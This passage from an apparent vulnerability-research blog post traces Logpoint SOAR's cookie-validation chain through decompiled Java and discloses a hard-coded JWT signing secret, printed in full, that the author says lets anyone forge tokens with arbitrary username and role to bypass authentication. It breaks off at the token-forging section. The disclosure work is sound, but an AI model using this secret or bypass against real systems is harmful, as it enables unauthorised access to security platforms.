<figure data-wp-context="{&#34;imageId&#34;:&#34;695b8511ca4f6&#34;}" data-wp-interactive="core/image" data-wp-key="695b8511ca4f6"><img loading="lazy" decoding="async" width="1024" height="470" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-accessing-internal-api-1024x470.jpg" alt="" srcset="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-accessing-internal-api-1024x470.jpg 1024w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-accessing-internal-api-300x138.jpg 300w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-accessing-internal-api-768x352.jpg 768w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-accessing-internal-api-1536x705.jpg 1536w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-accessing-internal-api.jpg 2029w" sizes="auto, (max-width: 1024px) 100vw, 1024px"/></figure>



<h2>One Cookie, Many Hops: Mapping the SOAR Authentication Pipeline</h2>



<p>Now it is time to follow the rabbit all the way down. To understand what is really happening, I need to look inside the microservices themselves. Are there other endpoints hiding in plain sight? How does cookie validation actually work behind the scenes?</p>



<p>Login-service: <code>com/secbi/login/generated/api/logpoint/LogpointApi.java</code> Has the following code section that corresponds to the API endpoint weâ€™ve seen on the 2nd request.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>@</span><span>RequestMapping</span><span>(</span></span>
<span><span>    </span><span>value</span><span> </span><span>=</span><span> </span><span>&#34;/logpoint/validate-cookie&#34;</span><span>,</span></span>
<span><span>    </span><span>produces</span><span> </span><span>=</span><span> { </span><span>&#34;application/json&#34;</span><span> },</span></span>
<span><span>    </span><span>method</span><span> </span><span>=</span><span> RequestMethod.POST</span></span>
<span><span>)</span></span>
<span><span>default</span><span> ResponseEntity</span><span>&lt;</span><span>ValidateCookieResponse</span><span>&gt;</span><span> </span><span>validateCookie</span><span>(</span></span>
<span><span>    @</span><span>ApiParam</span><span>(</span><span>value</span><span> </span><span>=</span><span> </span><span>&#34;cookie as String&#34;</span><span>, </span><span>required</span><span> </span><span>=</span><span> </span><span>true</span><span>)</span></span>
<span><span>    @</span><span>Valid</span><span> @</span><span>RequestBody</span><span> </span><span>final</span><span> Cookie cookie</span></span>
<span><span>) {</span></span>
<span><span>    </span><span>try</span><span> {</span></span>
<span><span>        </span><span>return</span><span> ResponseEntity.</span><span>ok</span><span>(</span></span>
<span><span>            authService.</span><span>validateCookie</span><span>(cookie.</span><span>getValue</span><span>())</span></span>
<span><span>        );</span></span>
<span><span>    }</span></span>
<span><span>    </span><span>catch</span><span> (Exception </span><span>e</span><span>) {</span></span>
<span><span>        LogpointApi.log.</span><span>error</span><span>(</span><span>&#34;Cookie validation failed&#34;</span><span>, e);</span></span>
<span><span>        </span><span>return</span><span> ResponseEntity.</span><span>status</span><span>(HttpStatus.INTERNAL_SERVER_ERROR).</span><span>build</span><span>();</span></span>
<span><span>    }</span></span>
<span><span>}</span></span></code></pre></div>



<p>The above code calls <code>validateCookie()</code> within the try-catch section, which means we need to keep jumping into these method definitions and understand the execution flow. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> ResponseEntity</span><span>&lt;</span><span>ValidateCookieResponse</span><span>&gt;</span><span> </span><span>validateCookie</span><span>(</span></span>
<span><span>        @</span><span>ApiParam</span><span>(</span><span>value</span><span> </span><span>=</span><span> </span><span>&#34;cookie&#34;</span><span>, </span><span>required</span><span> </span><span>=</span><span> </span><span>true</span><span>)</span></span>
<span><span>        @</span><span>Valid</span><span> @</span><span>RequestBody</span><span> </span><span>final</span><span> Cookie cookie</span></span>
<span><span>) {</span></span>
<span><span>    ValidateCookieResponse</span><span> </span><span>validateCookieResponse;</span></span>
<span></span>
<span><span>    </span><span>try</span><span> {</span></span>
<span><span>        validateCookieResponse </span><span>=</span></span>
<span><span>            </span><span>this</span><span>.logpointAuthorizationManager.</span><span>validateCookie</span><span>(cookie);</span></span>
<span><span>    }</span></span>
<span><span>    </span><span>catch</span><span> (</span><span>final</span><span> SecBiException </span><span>e</span><span>) {</span></span>
<span><span>        </span><span>throw</span><span> </span><span>new</span><span> </span><span>CustomException</span><span>(</span></span>
<span><span>            ErrorsEnum.GENERIC_500.</span><span>getId</span><span>(),</span></span>
<span><span>            (Throwable) e</span></span>
<span><span>        );</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>return</span><span> (ResponseEntity</span><span>&lt;</span><span>ValidateCookieResponse</span><span>&gt;</span><span>)</span></span>
<span><span>        </span><span>new</span><span> </span><span>ResponseEntity</span><span>(</span></span>
<span><span>            (Object) validateCookieResponse,</span></span>
<span><span>            HttpStatus.OK</span></span>
<span><span>        );</span></span>
<span><span>}</span></span>
<span></span></code></pre></div>



<p>On line 9 have <code>validateCookie()</code> from <code>logpointAuthorizationManager</code>. Keep tracking the calls. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> ValidateCookieResponse </span><span>validateCookie</span><span>(</span><span>final</span><span> Cookie cookie) throws SecBiException {</span></span>
<span></span>
<span><span>    </span><span>this</span><span>.</span><span>validateCookieStructure</span><span>(cookie);</span></span>
<span></span>
<span><span>    </span><span>final</span><span> String</span><span> </span><span>cookieValue</span><span> </span><span>=</span><span> cookie.</span><span>getValue</span><span>();</span></span>
<span></span>
<span><span>    </span><span>final</span><span> ActiveCookieValidationResult</span><span> </span><span>activeResult</span><span> </span><span>=</span><span> </span><span>this</span><span>.cookieValidator.</span><span>validateActive</span><span>(cookie);</span></span>
<span></span>
<span><span>    </span><span>if</span><span> (</span><span>!</span><span>activeResult.</span><span>isActive</span><span>()) {</span></span>
<span><span>        </span><span>this</span><span>.</span><span>removeLocalSession</span><span>(cookie);</span></span>
<span><span>        LogpointAuthorizationManager.logger.</span><span>info</span><span>(</span></span>
<span><span>            String.</span><span>format</span><span>(</span><span>&#34;verifyCookieStatus for cookie %s returns:INVALID_COOKIE&#34;</span><span>, cookieValue)</span></span>
<span><span>        );</span></span>
<span><span>        </span><span>return</span><span> </span><span>new</span><span> </span><span>ValidateCookieResponse</span><span>()</span></span>
<span><span>            .</span><span>cookieStatus</span><span>(CookieStatus.INVALID_COOKIE.</span><span>name</span><span>());</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>final</span><span> LocalSessionDetails</span><span> </span><span>localSession</span><span> </span><span>=</span><span> </span><span>this</span><span>.localSessionsStorage.</span><span>fetchByCookieValue</span><span>(cookieValue);</span></span>
<span></span>
<span><span>    </span><span>if</span><span> (localSession </span><span>!=</span><span> </span><span>null</span><span>) {</span></span>
<span><span>        </span><span>this</span><span>.localSessionsStorage.</span><span>updateLastActiveTimestampMillis</span><span>(</span></span>
<span><span>            cookieValue,</span></span>
<span><span>            System.</span><span>currentTimeMillis</span><span>()</span></span>
<span><span>        );</span></span>
<span></span>
<span><span>        LogpointAuthorizationManager.logger.</span><span>info</span><span>(</span></span>
<span><span>            String.</span><span>format</span><span>(</span></span>
<span><span>                </span><span>&#34;verifyCookieStatus for cookie %s returns:VALID_COOKIE_WITH_LOCAL_SESSION&#34;</span><span>,</span></span>
<span><span>                cookieValue</span></span>
<span><span>            )</span></span>
<span><span>        );</span></span>
<span></span>
<span><span>        </span><span>return</span><span> </span><span>new</span><span> </span><span>ValidateCookieResponse</span><span>()</span></span>
<span><span>            .</span><span>cookieStatus</span><span>(CookieStatus.VALID_COOKIE_WITH_LOCAL_SESSION.</span><span>name</span><span>())</span></span>
<span><span>            .</span><span>user</span><span>(activeResult.</span><span>getUser</span><span>());</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>   </span><span>// ... OMITTED CODE ...</span></span>
<span><span>}</span></span>
<span></span></code></pre></div>



<p>Thatâ€™s where we have two important function calls:</p>



<ul>
<li>Line 18: <code>fetchByCookieValue() </code>takes the cookie value itself</li>



<li>Line 7:<code>validateActive() </code>takes the cookie object itself</li>
</ul>



<p>If you remember the HTTP response from the Burp Suite screenshot a few sections ago, the same error code appears here: <code>VALID_COOKIE_WITH_LOCAL_SESSION</code>, now sitting right in the source code on line 28. That immediately narrows the focus. Before anything else, I need to understand what happens at line 18: <code>fetchByCookieValue()</code> call. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> LocalSessionDetails </span><span>fetchByCookieValue</span><span>(</span><span>final</span><span> String cookieValue) {</span></span>
<span><span>    </span><span>if</span><span> (StringUtils.</span><span>isBlank</span><span>((CharSequence) cookieValue)) {</span></span>
<span><span>        </span><span>return</span><span> </span><span>null</span><span>;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>final</span><span> Document</span><span> </span><span>cookieValueQuery</span><span> </span><span>=</span></span>
<span><span>        </span><span>new</span><span> </span><span>Document</span><span>(</span><span>&#34;cookie.value&#34;</span><span>, (Object) </span><span>new</span><span> </span><span>Document</span><span>(</span><span>&#34;$eq&#34;</span><span>, (Object) cookieValue));</span></span>
<span></span>
<span><span>    </span><span>final</span><span> FindIterable</span><span>&lt;</span><span>LocalSessionDetails</span><span>&gt; </span><span>localSessionDetails</span><span> </span><span>=</span></span>
<span><span>        (FindIterable</span><span>&lt;</span><span>LocalSessionDetails</span><span>&gt;</span><span>) </span><span>this</span><span>.localSessionsColl.</span><span>find</span><span>((Bson) cookieValueQuery);</span></span>
<span></span>
<span><span>    </span><span>if</span><span> (localSessionDetails </span><span>==</span><span> </span><span>null</span><span>) {</span></span>
<span><span>        </span><span>return</span><span> </span><span>null</span><span>;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>return</span><span> (LocalSessionDetails) localSessionDetails.</span><span>first</span><span>();</span></span>
<span><span>}</span></span></code></pre></div>



<p>This function does exactly what its name suggests. It queries MongoDB and validates the session. Nothing more. No strange logic, no suspicious shortcuts, nothing that feels exploitable at first glance.</p>



<p>But then line 7 comes back into focus. <code>validateActive()</code> does not validate a token or a string. It takes the cookie object itself. And while the Java implementation so far looks solid, experience has taught me one thing. Even when everything looks correct, that is exactly when you keep reading. You never really know what you are going to find.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> ActiveCookieValidationResult </span><span>validateActive</span><span>(</span><span>final</span><span> Cookie cookie) {</span></span>
<span></span>
<span><span>    </span><span>final</span><span> LogPointUser</span><span> </span><span>user</span><span> </span><span>=</span></span>
<span><span>        (LogPointUser) </span><span>this</span><span>.logpointCookiesCache.</span><span>get</span><span>(cookie);</span></span>
<span></span>
<span><span>    </span><span>if</span><span> (user </span><span>!=</span><span> </span><span>null</span><span>) {</span></span>
<span><span>        </span><span>return</span><span> </span><span>new</span><span> </span><span>ActiveCookieValidationResult</span><span>()</span></span>
<span><span>            .</span><span>active</span><span>(</span><span>true</span><span>)</span></span>
<span><span>            .</span><span>user</span><span>(user);</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>final</span><span> ActiveCookieValidationResult</span><span> </span><span>activeCookieValidationResult</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>externalValidation</span><span>(cookie);</span></span>
<span></span>
<span><span>    </span><span>// ... OMITTED CODE ...</span></span>
<span></span>
<span><span>    </span><span>return</span><span> activeCookieValidationResult;</span></span>
<span><span>}</span></span></code></pre></div>



<p>Thatâ€™s a bit interesting. The naming of the methods started to look more promising. Now weâ€™re going to have a look at <code>externalValidation()</code></p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> ActiveCookieValidationResult </span><span>externalValidation</span><span>(</span><span>final</span><span> Cookie cookie) {</span></span>
<span></span>
<span><span>    </span><span>if</span><span> (</span><span>this</span><span>.loginConfig.</span><span>isCookieValidationUseNewApi</span><span>()) {</span></span>
<span><span>        </span><span>return</span><span> </span><span>this</span><span>.</span><span>externalValidationNewApi</span><span>(cookie);</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>return</span><span> </span><span>this</span><span>.</span><span>externalValidationOldApi</span><span>(cookie);</span></span>
<span><span>}</span></span></code></pre></div>



<p>The <code>externalValidation()</code> function turns out to be deceptively simple. It checks <code>isCookieValidationUseNewApi()</code>, which does nothing more than return a value through basic setters and getters. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>private</span><span> ActiveCookieValidationResult </span><span>externalValidationNewApi</span><span>(</span><span>final</span><span> Cookie cookie) {</span></span>
<span></span>
<span><span>    UserInfoByCookieApiResponse</span><span> </span><span>userInfoByCookieApiResponse;</span></span>
<span></span>
<span><span>    </span><span>try</span><span> {</span></span>
<span><span>        userInfoByCookieApiResponse </span><span>=</span></span>
<span><span>            LogPointUtils.</span><span>fetchUserInfoByCookie</span><span>(</span></span>
<span><span>                </span><span>this</span><span>.loginConfig.</span><span>getLogpointServer</span><span>(),</span></span>
<span><span>                (</span><span>int</span><span>) Integer.</span><span>valueOf</span><span>(</span><span>this</span><span>.loginConfig.</span><span>getLogpointPrivateApiPort</span><span>()),</span></span>
<span><span>                cookie</span></span>
<span><span>            );</span></span>
<span><span>    }</span></span>
<span><span>    </span><span>catch</span><span> (</span><span>final</span><span> SecBiException </span><span>e</span><span>) {</span></span>
<span><span>        </span><span>throw</span><span> </span><span>new</span><span> </span><span>CustomException</span><span>(</span></span>
<span><span>            ErrorsEnum.LOGPOINT_COOKIE_VALIDATION_ERROR.</span><span>getId</span><span>(),</span></span>
<span><span>            (Throwable) e</span></span>
<span><span>        );</span></span>
<span><span>    }</span></span>
<span><span>}</span></span></code></pre></div>



<p>Finally, the <code>RestClient</code> comes into view. That is the missing link. The cookie I place in the request flows through all of these functions and is eventually handed to the RestClient for validation against yet another endpoint. In theory, that endpoint belongs to the legacy Python backend running on the host,</p>



<p>Bear with me, we are almost there. One last stop before concluding this rabbit hole visit is <code>fetchUserInfoByCookie()</code></p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> </span><span>static</span><span> UserInfoByCookieApiResponse </span><span>fetchUserInfoByCookie</span><span>(</span></span>
<span><span>        String logpointServer,</span></span>
<span><span>        </span><span>int</span><span> logpointPrivateApiPort,</span></span>
<span><span>        String logpointPrivateApiSchema,</span></span>
<span><span>        Cookie cookie</span></span>
<span><span>) {</span></span>
<span></span>
<span><span>    LogPointRestClientImpl</span><span> </span><span>logPointRestClient</span><span> </span><span>=</span><span> </span><span>null</span><span>;</span></span>
<span><span>    UserInfoByCookieApiResponse</span><span> </span><span>result;</span></span>
<span></span>
<span><span>    </span><span>try</span><span> {</span></span>
<span><span>        logPointRestClient </span><span>=</span></span>
<span><span>            </span><span>new</span><span> </span><span>LogPointRestClientImpl</span><span>(</span></span>
<span><span>                logpointServer,</span></span>
<span><span>                String.</span><span>valueOf</span><span>(logpointPrivateApiPort),</span></span>
<span><span>                logpointPrivateApiSchema,</span></span>
<span><span>                restClientConfig</span></span>
<span><span>            );</span></span>
<span></span>
<span><span>        result </span><span>=</span><span> logPointRestClient.</span><span>fetchUserInfoByCookie</span><span>(cookie);</span></span>
<span><span>    }</span></span>
<span><span>    </span><span>finally</span><span> {</span></span>
<span><span>        IOUtils.</span><span>closeQuietly</span><span>(logPointRestClient);</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>return</span><span> result;</span></span>
<span><span>}</span></span></code></pre></div>



<p>Finally, the <code>RestClient</code> comes into view. The cookie I include in the request flows through all these functions and is eventually handed to the RestClient for validation against another endpoint. In theory, that endpoint belongs to the legacy Python backend running on the host!</p>



<p>Lets just recap what is the call trace weâ€™ve been following.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>Burp Suite</span></span>
<span><span> â†’ GET </span><span>/</span><span>api</span><span>/</span><span>v1</span><span>/</span><span>session</span><span>/</span><span>username</span></span>
<span><span>   â†’ frontend NGINX</span></span>
<span><span>     â†’ login</span><span>-</span><span>service</span></span>
<span><span>       â†’ </span><span>validateCookie</span><span>(controller)</span></span>
<span><span>         â†’ logpointAuthorizationManager.validateCookie</span></span>
<span><span>           â†’ cookieValidator.validateActive</span></span>
<span><span>             â†’ cache lookup</span></span>
<span><span>             â†’ externalValidation</span></span>
<span><span>               â†’ externalValidationNewApi</span></span>
<span><span>                 â†’ LogPointUtils.fetchUserInfoByCookie</span></span>
<span><span>                   â†’ LogPointRestClientImpl.fetchUserInfoByCookie   </span><span>&lt;--</span><span> HERE WE ARE</span></span>
<span><span>           â†’ Mongo localSessionsStorage.fetchByCookieValue</span></span></code></pre></div>



<p>To prove that we can hit all the way there. Iâ€™ve changed our cookie value to something that doensnâ€™t exist. Therefore, we will be able to avoid internal caching of this service and reach all the way to the <code>fetchUserInfoByCookie()</code></p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;695b8511cb093&#34;}" data-wp-interactive="core/image" data-wp-key="695b8511cb093"><img loading="lazy" decoding="async" width="1024" height="310" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-cookie-validation-1024x310.jpg" alt="" srcset="https://mehmetince.net/wp-content/uploads/2025/12/logpoint-cookie-validation-1024x310.jpg 1024w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-cookie-validation-300x91.jpg 300w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-cookie-validation-768x233.jpg 768w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-cookie-validation-1536x466.jpg 1536w, https://mehmetince.net/wp-content/uploads/2025/12/logpoint-cookie-validation-2048x621.jpg 2048w" sizes="auto, (max-width: 1024px) 100vw, 1024px"/></figure>



<p>Expected return error, but the shocking moment for me was actually on my terminal. I look for the <code>secbi/login-service</code> container logs and seen this message.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>2024</span><span>-</span><span>06</span><span>-</span><span>18</span><span> </span><span>10</span><span>:</span><span>09</span><span>:</span><span>37.882</span><span> </span><span>INFO</span><span>  [nio</span><span>-</span><span>8072</span><span>-</span><span>exec</span><span>-</span><span>7</span><span>]c.s.r.c.e.l.LogPointRestClientImpl</span></span>
<span><span>fetching user information by cookie...</span></span>
<span></span>
<span><span>2024</span><span>-</span><span>06</span><span>-</span><span>18</span><span> </span><span>10</span><span>:</span><span>09</span><span>:</span><span>37.882</span><span> </span><span>INFO</span><span>  [nio</span><span>-</span><span>8072</span><span>-</span><span>exec</span><span>-</span><span>7</span><span>]c.s.r.c.e.l.LogPointRestClientImpl</span></span>
<span><span>LOGPOINT</span><span> </span><span>API</span><span> </span><span>call</span><span>:</span></span>
<span><span>Method</span><span>:</span><span> GET</span></span>
<span><span>URL</span><span>:</span><span> http</span><span>:</span><span>//127.0.0.1:18000/User/preference</span></span>
<span><span>cookie</span><span>:</span><span> </span><span>class</span><span> </span><span>Cookie</span><span> {</span></span>
<span><span>  key</span><span>:</span><span> session</span></span>
<span><span>  value</span><span>:</span><span> INVALIDCOOKIE</span></span>
<span><span>}</span></span></code></pre></div>



<p>I remember this endpoint from the Python backend code analysis. At the time, its purpose was unclear. Now it finally makes sense. Everything I have learned along this path connects here, and it will matter later.</p>



<p>The original question is answered, but it leaves me with even more questions than I started with. And that is usually a good sign.</p>



<h3>One Answer Raises Multiple Questions</h3>



<p>We now understand how the <code>secbi/login-service</code> endpoint at <code>/soar/api/v1/session/username</code> works internally. But instead of closing the loop, it raises even more questions:</p>



<ul>
<li>Why does an API exist just to return a username?</li>



<li>What about the other Docker services like <code>secbi/backend-service</code>, <code>secbi/api-service</code>, or <code>secbi/workflows</code>?</li>



<li>Does every request to these services trigger another internal call to <code>secbi/login-service</code>, and then again to <code>127.0.0.1:18000/User/preference</code> ?</li>



<li>Where does authorization actually happen in a SOAR platform of this size ?</li>



<li>Why not use a shared JWT model between the <code>secbi/*</code> microservices instead of chaining internal HTTP requests?</li>
</ul>



<p>At this point, the design starts to feel less like an optimization and more like an assumption worth challenging.</p>



<h2>Bug 2: Hard-coded JWT SECRET and Authentication Bypass On ALL SOAR APIs</h2>



<p>With a clearer understanding of how session validation works between the Java services and the legacy Python backend, one question keeps nagging at me. User-initiated requests might follow this chain of HTTP calls, but how are service-to-service requests authenticated? Workflows, schedulers, cronjobs all run without a user behind them. There has to be something in place.<br/></p>



<p>At this point, the familiar 4 a.m. feeling kicks in. Too many questions, not enough answers. I step away, get some sleep, and come back a few hours later with a clearer head. This time, I remind myself why I enjoy this kind of work. Reading someone elseâ€™s code, understanding their decisions, and following the paths they laid out is half the fun. So I stop piling on questions and do the simplest thing instead. I go back to the code and keep reading. </p>



<p>Within a few minutes, I literally stumbled upon the following controller method. There is nothing we can exploit here, but what the heck is the RequestHeader annotation of <code>secbi_auth_token </code>, which is not even required by default ??</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>@</span><span>RequestMapping</span><span>(</span></span>
<span><span>    </span><span>value</span><span> </span><span>=</span><span> </span><span>&#34;/user/auth/apikey&#34;</span><span>,</span></span>
<span><span>    </span><span>produces</span><span> </span><span>=</span><span> {</span><span>&#34;application/json&#34;</span><span>},</span></span>
<span><span>    </span><span>method</span><span> </span><span>=</span><span> RequestMethod.GET</span></span>
<span><span>)</span></span>
<span><span>default</span><span> ResponseEntity</span><span>&lt;</span><span>List</span><span>&lt;</span><span>ApiCredentials</span><span>&gt;&gt;</span><span> </span><span>getAllApiCredentialsByToken</span><span>(</span></span>
<span><span>    @</span><span>ApiParam</span><span>(</span><span>&#34;The authentication token as generated upon login&#34;</span><span>)</span></span>
<span><span>    @</span><span>RequestHeader</span><span>(</span><span>value</span><span> </span><span>=</span><span> </span><span>&#34;secbi_auth_token&#34;</span><span>, </span><span>required</span><span> </span><span>=</span><span> </span><span>false</span><span>)</span></span>
<span><span>    </span><span>final</span><span> String secbiAuthToken</span></span>
<span><span>) {</span></span>
<span></span>
<span><span>    </span><span>if</span><span> (</span><span>this</span><span>.</span><span>getObjectMapper</span><span>().</span><span>isPresent</span><span>() </span><span>&amp;&amp;</span><span> </span><span>this</span><span>.</span><span>getAcceptHeader</span><span>().</span><span>isPresent</span><span>()) {</span></span>
<span><span>        </span><span>if</span><span> (</span><span>!</span><span>this</span><span>.</span><span>getAcceptHeader</span><span>().</span><span>get</span><span>().</span><span>contains</span><span>(</span><span>&#34;application/json&#34;</span><span>)) {</span></span>
<span></span>
<span><span>            </span><span>return</span><span> (ResponseEntity</span><span>&lt;</span><span>List</span><span>&lt;</span><span>ApiCredentials</span><span>&gt;&gt;</span><span>)</span></span>
<span><span>                </span><span>new</span><span> </span><span>ResponseEntity</span><span>(HttpStatus.NOT_IMPLEMENTED);</span></span>
<span><span>        }</span></span>
<span></span>
<span><span>        </span><span>try</span><span> {</span></span>
<span><span>           </span><span>// ... OMITTED CODE ...</span></span>
<span><span>        }</span></span>
<span><span>        </span><span>catch</span><span> (</span><span>final</span><span> IOException </span><span>e</span><span>) {</span></span>
<span><span>            </span><span>// ... OMITTED CODE ...;</span></span>
<span><span>        }</span></span>
<span><span>    }</span></span>
<span><span>    </span><span>// ... OMITTED CODE ...</span></span>
<span><span>}</span></span>
<span></span></code></pre></div>



<p>A few minutes later, things finally click. The answer is already there in the code. Internally, the microservices support an API key mechanism per user. It is not enabled by default, at least not yet, but the plumbing clearly exists.</p>



<p>Digging a bit deeper leads me straight to the file I am looking for<code>JWTLoginAuthorizationManager.java</code> This is where this research stopped feeling academic! I actually started to feel like I might actually have something to abuse! </p>



<p>This class handles <mark>JWT</mark> validation using a <mark>hard-coded secret</mark> and is responsible not only for verifying the token but also for returning the associated permissions. The service-to-service authentication story suddenly makes a lot more sense.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>public</span><span> </span><span>class</span><span> </span><span>JWTLoginAuthorizationManager</span></span>
<span><span>        </span><span>extends</span><span> </span><span>AbstractLoginAuthorizationManager</span><span> {</span></span>
<span></span>
<span><span>    </span><span>private</span><span> </span><span>static</span><span> </span><span>final</span><span> String</span><span> </span><span>JWT_ENCODED_SECRET</span><span> </span><span>=</span><span> </span><span>&#34;WW4wWVRGQVdid0ZsTDhXWFNUQXJDQ0JWVEdzPQ==&#34;</span><span>;</span></span>
<span></span>
<span><span>    </span><span>private</span><span> </span><span>static</span><span> </span><span>final</span><span> String</span><span> </span><span>CLAIM_USERNAME</span><span> </span><span>=</span><span> </span><span>&#34;username&#34;</span><span>;</span></span>
<span><span>    </span><span>private</span><span> </span><span>static</span><span> </span><span>final</span><span> String</span><span> </span><span>CLAIM_TOKEN_TYPE</span><span> </span><span>=</span><span> </span><span>&#34;token_type&#34;</span><span>;</span></span>
<span><span>    </span><span>private</span><span> </span><span>static</span><span> </span><span>final</span><span> String</span><span> </span><span>CLAIM_ROLE</span><span> </span><span>=</span><span> </span><span>&#34;role&#34;</span><span>;</span></span>
<span></span>
<span><span>    </span><span>private</span><span> </span><span>boolean</span><span> </span><span>tokenExpirationEnabled;</span></span>
<span><span>    </span><span>private</span><span> </span><span>int</span><span> </span><span>expirationMins;</span></span>
<span></span>
<span><span>    </span><span>public</span><span> </span><span>JWTLoginAuthorizationManager</span><span>(</span></span>
<span><span>            </span><span>final</span><span> </span><span>boolean</span><span> </span><span>tokenExpirationEnabled</span><span>,</span></span>
<span><span>            </span><span>final</span><span> </span><span>int</span><span> </span><span>expirationMins</span></span>
<span><span>    ) {</span></span>
<span><span>        </span><span>this</span><span>.tokenExpirationEnabled </span><span>=</span><span> tokenExpirationEnabled;</span></span>
<span><span>        </span><span>this</span><span>.expirationMins </span><span>=</span><span> expirationMins;</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>public</span><span> </span><span>void</span><span> </span><span>init</span><span>(</span><span>final</span><span> Properties </span><span>properties</span><span>) {</span></span>
<span><span>        </span><span>super</span><span>.</span><span>init</span><span>(properties);</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    </span><span>public</span><span> IUser </span><span>verifyUserAuthToken</span><span>(</span><span>final</span><span> String </span><span>authToken</span><span>) {</span></span>
<span><span>        IUser</span><span> </span><span>user;</span></span>
<span></span>
<span><span>        </span><span>try</span><span> {</span></span>
<span><span>            </span><span>if</span><span> (StringUtils.</span><span>isBlank</span><span>((CharSequence) authToken)) {</span></span>
<span><span>                </span><span>throw</span><span> </span><span>new</span><span> </span><span>CustomException</span><span>(</span></span>
<span><span>                    ErrorsEnum.INVALID_AUTH_TOKEN.</span><span>getId</span><span>()</span></span>
<span><span>                );</span></span>
<span><span>            }</span></span>
<span></span>
<span><span>            </span><span>final</span><span> Claims</span><span> </span><span>claims</span><span> </span><span>=</span><span> </span><span>this</span><span>.</span><span>getTokenClaims</span><span>(authToken);</span></span>
<span></span>
<span><span>            </span><span>final</span><span> TokenType</span><span> </span><span>tokenType</span><span> </span><span>=</span></span>
<span><span>                TokenType.</span><span>getByType</span><span>(</span></span>
<span><span>                    claims.</span><span>get</span><span>((Object) </span><span>&#34;token_type&#34;</span><span>).</span><span>toString</span><span>()</span></span>
<span><span>                );</span></span>
<span></span>
<span><span>            </span><span>if</span><span> (</span><span>!</span><span>TokenType.AUTH.</span><span>equals</span><span>((Object) tokenType)) {</span></span>
<span><span>                </span><span>throw</span><span> </span><span>new</span><span> </span><span>CustomException</span><span>(</span></span>
<span><span>                    ErrorsEnum.INVALID_TOKEN_TYPE.</span><span>getId</span><span>()</span></span>
<span><span>                );</span></span>
<span><span>            }</span></span>
<span></span>
<span><span>            user </span><span>=</span><span> (IUser) </span><span>new</span><span> </span><span>User</span><span>();</span></span>
<span><span>            user.</span><span>setUsername</span><span>(</span></span>
<span><span>                claims.</span><span>get</span><span>((Object) </span><span>&#34;username&#34;</span><span>).</span><span>toString</span><span>()</span></span>
<span><span>            );</span></span>
<span><span>            user.</span><span>setRole</span><span>(</span></span>
<span><span>                UserRole.</span><span>valueOf</span><span>(</span></span>
<span><span>                    claims.</span><span>get</span><span>((Object) </span><span>&#34;role&#34;</span><span>).</span><span>toString</span><span>()</span></span>
<span><span>                ).</span><span>getRole</span><span>()</span></span>
<span><span>            );</span></span>
<span><span>            user.</span><span>setTokenStrategy</span><span>(TokenStrategy.JWT.</span><span>name</span><span>());</span></span>
<span><span>        }</span></span>
<span><span>        </span><span>catch</span><span> (Exception </span><span>e</span><span>) {</span></span>
<span><span>            </span><span>throw</span><span> e;</span></span>
<span><span>        }</span></span>
<span></span>
<span><span>        </span><span>return</span><span> user;</span></span>
<span><span>    }</span></span>
<span><span>}</span></span>
<span></span></code></pre></div>



<p>The class validates <code>secbi_auth_token</code> JWTs derive the user identity and role from the token claims. The first critical, directly exploitable issue is that the signing secret is hard-coded as a static constant. I can mint my own valid JWTs with <code>token_type=AUTH</code> and arbitrary <code>username</code> and <code>role</code> claims, then access any endpoint that relies on the <code>secbi_auth_token</code> header within the Java microservice world!!!</p>



<h3>Forging the valid JWT Token </h3>



<p>I copied all the required jar files from Logpoint instance to my local at the beginning. I used them to build the following code to forge a valid JWT token.</p>



